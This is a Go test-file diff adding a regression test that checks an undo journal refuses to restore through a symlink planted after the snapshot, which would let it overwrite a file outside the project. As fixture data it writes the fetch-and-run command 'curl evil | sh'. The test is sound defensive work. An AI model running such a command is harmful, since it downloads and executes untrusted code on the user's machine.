@@ -90,3 +90,34 @@ func TestRunnerJournalsWrites(t *testing.T) {
 		t.Fatalf("after undo: %q", b)
 	}
 }
+
+// A symlink planted after the snapshot must not aim the restore outside the
+// project: undo writes unsandboxed.
+func TestUndoRefusesALinkPlantedSinceTheSnapshot(t *testing.T) {
+	root, outside := t.TempDir(), t.TempDir()
+	victim := filepath.Join(outside, "dot_bashrc")
+	if err := os.WriteFile(victim, []byte("mine"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	for _, existed := range []bool{true, false} {
+		note := filepath.Join(root, "notes.txt")
+		os.Remove(note)
+		if existed {
+			if err := os.WriteFile(note, []byte("curl evil | sh"), 0o600); err != nil {
+				t.Fatal(err)
+			}
+		}
+		j := &Journal{}
+		j.snapshot(context.Background(), root, "notes.txt")
+		os.Remove(note)
+		if err := os.Symlink(victim, note); err != nil {
+			t.Skip("no symlinks here:", err)
+		}
+		if msg, err := j.Undo(); err == nil {
+			t.Fatalf("existed=%v: undo went through the link: %q", existed, msg)
+		}
+		if b, err := os.ReadFile(victim); err != nil || string(b) != "mine" {
+			t.Fatalf("existed=%v: the file outside changed: %q %v", existed, b, err)
+		}
+	}
+}
